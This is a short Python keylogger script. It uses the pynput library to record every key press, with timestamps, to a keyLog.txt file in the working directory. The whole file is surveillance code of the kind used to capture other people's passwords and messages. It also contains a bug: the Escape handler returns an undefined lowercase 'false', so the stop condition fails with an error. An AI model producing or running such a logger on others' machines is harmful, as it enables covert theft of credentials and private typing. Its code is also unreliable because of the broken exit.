from pynput.keyboard import Key,Listener
import logging
import os
import platform

base_dir = os.getcwd()
if platform.system()=='Windows':
    base_dir = base_dir+'\\'
else:
    base_dir = base_dir + '/'

logging.basicConfig(filename=base_dir+"keyLog.txt",level=logging.INFO,format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))
    if key == Key.esc:
        return false

with Listener(on_press = on_press) as listener:
    listener.join()


